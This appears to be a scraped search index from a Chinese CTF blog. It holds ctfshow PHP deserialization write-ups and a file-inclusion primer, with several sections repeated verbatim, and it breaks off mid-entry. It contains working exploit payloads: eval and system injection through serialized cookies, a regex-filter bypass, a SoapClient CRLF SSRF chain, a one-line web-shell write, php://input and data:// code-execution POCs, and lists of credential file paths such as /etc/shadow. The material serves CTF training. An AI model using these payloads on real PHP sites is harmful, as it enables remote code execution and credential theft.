if($user-\u003elogin($username,$password)){ if($user-\u003echeckVip()){ $user-\u003evipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } 要求svip为true，同时username和password的值不同 思路同类似上题 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web256"},{"categories":["CTF","web"],"content":"\r[web257] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 20:33:07 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ private $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ $user = unserialize($_COOKIE['user']); $user-\u003elogin($username,$password); } __destruct() 是PHP面向对象编程的另一个重要的魔法函数，该函数会在类的一个对象被删除时自动调用。 我们可以在该函数中添加一些释放资源的操作，比如关闭文件、关闭数据库链接、清空一个结果集等。其实，__destruct() 在日常的编码中并不常见，因为它是非必须的，是类的可选组成部分。通常只是用来完成对象被删除时的清理动作而已。 **反序列化题目的宗旨：**不能修改类方法的代码，但可以控制类方法的属性，通过类方法的属性来执行我们需要的操作 username和password只需要存在即可 \u003c?php class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-\u003eclass=new backDoor(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ private $code='eval($_POST[Ki1ro]);'; public function getInfo(){ eval($this-\u003ecode); } } echo urlencode(serialize(new ctfShowUser())); ?\u003e payload： GET username=1\u0026password=2 COOKIE user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A20%3A%22eval%28%24_POST%5BKi1ro%5D%29%3B%22%3B%7D%7D ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web257"},{"categories":["CTF","web"],"content":"\r[web258] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-02 17:44:47 # @Last Modified by: h1xa # @Last Modified time: 2020-12-02 21:38:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'info'; public function __construct(){ $this-\u003eclass=new info(); } public function login($u,$p){ return $this-\u003eusername===$u\u0026\u0026$this-\u003epassword===$p; } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class info{ public $user='xxxxxx'; public function getInfo(){ return $this-\u003euser; } } class backDoor{ public $code; public function getInfo(){ eval($this-\u003ecode); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) \u0026\u0026 isset($password)){ if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){ $user = unserialize($_COOKIE['user']); } $user-\u003elogin($username,$password); } 对形如O:8进行了过滤，我们可以在数字前加上加号绕过 执行一下php代码，并通过cookie传参 \u003c?php class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=true; public $class = 'backDoor'; public function __construct(){ $this-\u003eclass=new backDoor(); } public function __destruct(){ $this-\u003eclass-\u003egetInfo(); } } class backDoor{ public $code=\"system('cat flag.php');\"; public function getInfo(){ eval($this-\u003ecode); } } $a = new ctfShowUser(); $a = serialize($a); $a= str_replace('O:', 'O:+',$a);//绕过preg_match echo urlencode($a); username和password随意 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web258"},{"categories":["CTF","web"],"content":"\r[web259]\r\u003c?php highlight_file(__FILE__); $vip = unserialize($_GET['vip']); //vip can get flag one key $vip-\u003egetFlag(); Notice: Undefined index: vip in /var/www/html/index.php on line 6 Fatal error: Uncaught Error: Call to a member function getFlag() on bool in /var/www/html/index.php:8 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 8 这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。 php的原生类SoapClient https://www.php.net/manual/en/class.soapclient.php php执行： \u003c?php $target = 'http://127.0.0.1/flag.php'; $post_string = 'token=ctfshow'; $b = new SoapClient(null,array('location' =\u003e $target,'user_agent'=\u003e'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=\u003e \"ssrf\")); $a = serialize($b); $a = str_replace('^^',\"\\r\\n\",$a); echo urlencode($a); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web259"},{"categories":["CTF","web"],"content":"\r[web260]本题考点比较单一，传入含有不间断ctfshow_i_love_36D就可以 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web260"},{"categories":["CTF","web"],"content":"\r[web261] \u003c?php highlight_file(__FILE__); class ctfshowvip{ public $username; public $password; public $code; public function __construct($u,$p){ $this-\u003eusername=$u; $this-\u003epassword=$p; } public function __wakeup(){ if($this-\u003eusername!='' || $this-\u003epassword!=''){ die('error'); } } public function __invoke(){ eval($this-\u003ecode); } public function __sleep(){ $this-\u003eusername=''; $this-\u003epassword=''; } public function __unserialize($data){ $this-\u003eusername=$data['username']; $this-\u003epassword=$data['password']; $this-\u003ecode = $this-\u003eusername.$this-\u003epassword; } public function __destruct(){ if($this-\u003ecode==0x36d){ file_put_contents($this-\u003eusername, $this-\u003epassword); } } } unserialize($_GET['vip']); 这里面全是魔术方法 __invoke()当尝试将对象调用为函数时触发,但是这里没有相关的函数，所以这个相当于没用 __destruct()``$this-\u003ecode==0x36d是弱类型比较，0x36d没有引号代表数字，十六进制0x36d转为十进制是877,我们只要让a=877.php，b为一句话木马即可 \u003c?php class ctfshowvip{ public $username; public $password; public function __construct(){ $this-\u003eusername='877.php'; $this-\u003epassword=\"\u003c?php eval(system('tac /fl*')); ?\u003e\"; } } echo urlencode(serialize(new ctfshowvip())); ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web261"},{"categories":["CTF","web"],"content":"\r[web262] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-12-03 02:37:19 # @Last Modified by: h1xa # @Last Modified time: 2020-12-03 16:05:38 # @message.php # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-\u003efrom = $f; $this-\u003emsg = $m; $this-\u003eto = $t; } } $f = $_GET['f']; $m = $_GET['m']; $t = $_GET['t']; if(isset($f) \u0026\u0026 isset($m) \u0026\u0026 isset($t)){ $msg = new message($f,$m,$t); $umsg = str_replace('fuck', 'loveU', serialize($msg)); setcookie('msg',base64_encode($umsg)); echo 'Your message has been sent'; } highlight_file(__FILE__); 非预期解：访问message.php，得到： \u003c?php highlight_file(__FILE__); include('flag.php'); class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-\u003efrom = $f; $this-\u003emsg = $m; $this-\u003eto = $t; } } if(isset($_COOKIE['msg'])){ $msg = unserialize(base64_decode($_COOKIE['msg'])); if($msg-\u003etoken=='admin'){ echo $flag; } } 发送一个值为msg的cookie，并且token=admin payload： \u003c?php class message{ public $token='admin'; } $a = serialize(new message()); echo base64_encode($a) ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web262"},{"categories":["CTF","web"],"content":"\r[web263]session反序列化 ","date":"2023-11-17","objectID":"/ctfshow_deserialize/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_deserialize","uri":"/ctfshow_deserialize/#web263"},{"categories":["CTF","web"],"content":"ctfshow文件包含专题 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#"},{"categories":["CTF","web"],"content":"\r总结：文件包含漏洞全面详解 php文件包含函数： require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#总结"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#本地文件包含漏洞lfi"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#常见敏感信息路径"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#配合文件上传使用"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含apache日志文件"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含session文件"},{"categories":["CTF","web"],"content":"\r本地文件包含漏洞(LFI)\r常见敏感信息路径:Windows系统: C:\\boot.ini //查看系统版本 C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\windows\\repair\\sam //存储Windows系统初次安装的密码 C:\\ProgramFiles\\mysql\\my.ini //Mysql配置 C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码 C:\\windows\\php.ini //php配置信息 Linux/Unix系统: /etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。 利用条件： 对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知 以直接访问的形式来写入如访问127.0.0.1\u003c?php phpinfo();?\u003e在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码 包含Session文件利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径: /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#包含临时文件"},{"categories":["CTF","web"],"content":"\r远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php\u003c5.3.4）、?截断（?后内容被视作GET传参） ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#远程文件包含rfi"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#php伪协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on allow_url_include：on POC： data://text/plain,\u003c?php phpinfo();?\u003e //如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入： data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= ","date":"2023-11-17","objectID":"/ctfshow_file_include/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#file协议"},{"categories":["CTF","web"],"content":"\rPHP伪协议\rfile://协议file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 file:// [文件的绝对路径和文件名] php://协议php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码。 php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 利用条件: allow_url_fopen ：off/on allow_url_include：off/on 例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用php://filter/convert.base64-encode/resource=文件路径来得到base64编码后的字符串，通过base64解码即可得到php完整源码 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 利用条件: allow_url_fopen ：off/on allow_url_include：on ZIP://协议zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型还有zlib://和bzip2:// 利用条件: allow_url_fopen ：off/on allow_url_include：off/on POC： zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt data://协议data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数： 利用条件: allow_url_fopen ：on 